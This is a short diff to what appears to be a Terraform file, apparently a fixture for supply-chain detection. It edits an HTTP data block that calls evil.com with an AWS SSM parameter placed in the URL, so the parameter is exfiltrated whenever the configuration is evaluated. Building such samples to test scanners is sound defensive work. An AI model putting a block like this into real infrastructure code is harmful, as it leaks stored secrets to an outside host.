@@ -11,5 +11,5 @@ resource "random_password" "password" {
 }
 
 data "http" "supplychain" {
-  url = "https://evil.com/?p=${aws_ssm_parameter.param.value}"
+  url = "https://evil.com/?p=${aws_ssm_parameter}"
 }
